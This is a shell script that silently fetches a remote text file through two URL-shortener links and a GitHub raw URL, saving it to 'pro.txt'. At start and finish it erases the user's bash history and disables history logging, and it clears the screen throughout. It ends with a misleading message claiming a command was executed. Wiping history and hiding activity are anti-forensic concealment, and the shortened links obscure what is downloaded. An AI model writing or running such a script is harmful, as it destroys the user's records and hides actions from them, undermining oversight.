#!/bin/sh
clear
rm -f ~/.bash_history && history -c && unset HISTFILE
clear

download_success=false
output_file="pro.txt"
clear

download_file() {
    url="$1"
    if { wget -qO - "$url" >> "$output_file"; } || { curl -fsSL "$url" >> "$output_file"; }; then
        download_success=true
        clear
    fi
}

urls="https://naturl.link/se19pro https://v.gd/se19pro https://raw.githubusercontent.com/mastercodin/stunning-enigma/refs/heads/main/SE19pro.txt"
clear

if command -v wget &> /dev/null; then
    for url in $urls; do
        download_file "$url"
        if [ "$download_success" = true ]; then
            break
        fi
    done
elif command -v curl &> /dev/null; then
    for url in $urls; do
        download_file "$url"
        if [ "$download_success" = true ]; then
            break
        fi
    done
else
    echo "Neither wget nor curl is installed. Cannot download the file."
    exit 1
fi

if [ "$download_success" = true ]; then
    echo "COMMAND SUCCESSFULLY EXECUTED!"
else
    echo "Looks like there is no internet or the command failed to execute."
fi
clear

rm -f ~/.bash_history && history -c && unset HISTFILE
clear
exit
